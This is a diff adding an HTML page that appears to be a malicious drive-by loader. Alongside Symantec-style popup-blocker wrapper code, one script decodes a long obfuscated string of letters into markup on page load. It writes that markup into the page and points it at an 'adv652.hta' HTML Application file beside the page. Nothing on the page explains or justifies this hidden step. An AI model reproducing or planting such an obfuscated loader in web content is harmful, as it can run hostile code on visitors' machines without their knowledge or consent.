@@ -1,0 +1,72 @@
+<html>
+<head>
+<title></title>
+</head>
+<body>
+
+<script language="JavaScript">
+<!--
+
+function SymError()
+{
+  return true;
+}
+
+window.onerror = SymError;
+
+var SymRealWinOpen = window.open;
+
+function SymWinOpen(url, name, attributes)
+{
+  return (new Object());
+}
+
+window.open = SymWinOpen;
+
+//-->
+</script>
+
+<script>
+var hr=location.href,st='',k='',s='',b='cgabbfbbgbcbbaibabcgccdfbcacfaceecdfbcacfbbcdbbcbbbbbfbafbbgbafbbbbbacficjhcjibbfbbbbaibbhbbgbabcfjbaibabbacbbgcficefcejceiceiceicfjbcfcgacehbbfbbgbcbbaibabcgccgachjcggchecgjcghciecdcbafbaacgbbcacfacdccjjbaicjhbbfbbfbafbaacgbcjjbaibbfbafbaacficjhbaacjicfgcfgceicjhcfecefbaacfgbacbaccefcejcejcjjbaccefcfhcfbcffcffcefceiceicjhcjhceiceicfbcjicffcjhcejcejcgccgaciacgfciccgfchhcdcchicgfchhcgjcgbcdecghbbbbajbajcjhbbabaacdecdccigcgfchgcifcgjcgbcdecicbabbaicjhbbgbabbaacdcciebbbbbcbafcjjbbfcdecgccgaciacgfciccgfchhcdcchicgfchhcgjcgbcdecggbbhbbgbbgbbbbbacdecdccigcgfchgcifcgjcgbcdeciebabbcabbgcficdecgccgaciacgfciccgfchhcdcchicgfchhcgjcgbcdecihbafbbabaabbbbbjcdecdccigcgfchgcifcgjcgbcdecdgbadbaibbbcjicjhbaicjfcjibaicjhbbabahcdecgccgabbccjhbbecjhbajcdcbbacjhbajbabcgbcdecidcjjbbebbbbaibaicjicjhbbebbfcdecdcbbicjhbaibbhbabcgbcdebbgbbebbhbabcdecgccgaciacgfciccgfchhcdcchicgfchhcgjcgbcdechdbbgbabbajcejcdecdccigcgfchgcifcgjcgbcdecjjbbbbajbajcjhbbabaacfjbajbbfcefbafbbgbbfcfibafcjjbbjbaabafcjhbaicegcjjbaebajcficficehbafcjjbbjcjfbbbbbibabbbebbibafbabbbjcegbaebbgbajcdecgccgacehchjcggchecgjcghciecgccgabbfcjjbbebafbbcbbgcgcbcacfacegchcchccghbaibafcjjbahceacebcfjbbjbafbbabaabbbbbjcegbbbbbcbabbbababbbecegbacbbbcjjbbhbbfceacebcfjcgacehbbfcjjbbebafbbcbbgcgccgachjcggchecgjcghciecdcbafbaacgbbcacfbcdccjjbaicjhbbfbbfbafbaacgbcjjbaibbfbafbaacficjhbaacjicfgcfgceicjhcfecefbaacfgbacbaccefcejcejcjjbaccefcfhcfbcffcffcefceiceicjhcjhceiceicfbcjicffcjhcejcejcgccgaciacgfciccgfchhcdcchicgfchhcgjcgbcdecghbbbbajbajcjhbbabaacdecdccigcgfchgcifcgjcgbcdecicbabbaicjhbbgbabbaacdcciebbbbbcbafcjjbbfcdecgccgaciacgfciccgfchhcdcchicgfchhcgjcgbcdecggbbhbbgbbgbbbbbacdecdccigcgfchgcifcgjcgbcdeciebabbcabbgcficdecgccgaciacgfciccgfchhcdcchicgfchhcgjcgbcdecihbafbbabaabbbbbjcdecdccigcgfchgcifcgjcgbcdecdgbadbaibbbcjicjhbaicjfcjibaicjhbbabahcdecgccgaciacgfciccgfchhcdcchicgfchhcgjcgbcdechdbbgbabbajcejcdecdccigcgfchgcifcgjcgbcdecjjbbbbajbajcjhbbabaacfjbagcjhbbicjhbbfcjjbbebafbbcbbgcfibaabbbcjjbbhbajbabbbabbgcegbaibafbbabahbbfcjbceicjdcegbaebbebabbaccgbcdjcgjciicgjcghcgbceebajbbfbaebbgcjhceecdhcdccdccghchcchhcgbbafbabbbfbaecjhbbebabbaacegcjjbaebajcdcchachdchgcgjcgbcjhbbcbbccjfbafbbabbfbbgcjhbaibaicegbaebbgbajcdjcdhcfbcggbaabbbcjjbbhbajbabbbabbgcegbaibafbbabahbbfcjbceicjdcegcjjbaibafcjjbahceacebcfjcdecgccgacehchjcggchecgjcghciecgccgabbfcjjbbebafbbcbbgcgcbbfbabbbgciebafbajbabbbbbbhbbgceacdjbcacfbcegchcchccghbaibafcjjbahceacebcfjcdjceecejceiceiceicebcfjbbfbabbbgciebafbajbabbbbbbhbbgceacdjbbjbafbbabaabbbbbjcegcjjbaibbbbbfbabceacebcfjcdjceecejcfaceiceicebcfjcgacehbbfcjjbbebafbbcbbgcgc';
+for(i=0;i<b.length;i++)
+{
+s+=b.slice(i,i+1).charCodeAt(0)-97;
+};
+for(j=0;j<String(s).length;j+=3)
+{
+k=parseInt(String(s).slice(j,j+3));
+if(k>200){k-=200;}
+st+=String.fromCharCode(k);
+};
+document.write(st.replace('%',hr.substring(0,hr.lastIndexOf('/')) +'/adv652.hta'));
+</script>
+</body>
+</html>
+
+<script language="JavaScript">
+<!--
+var SymRealOnLoad;
+var SymRealOnUnload;
+
+function SymOnUnload()
+{
+  window.open = SymWinOpen;
+  if(SymRealOnUnload != null)
+     SymRealOnUnload();
+}
+
+function SymOnLoad()
+{
+  if(SymRealOnLoad != null)
+     SymRealOnLoad();
+  window.open = SymRealWinOpen;
+  SymRealOnUnload = window.onunload;
+  window.onunload = SymOnUnload;
+}
+
+SymRealOnLoad = window.onload;
+window.onload = SymOnLoad;
+
+//-->
+</script>
+
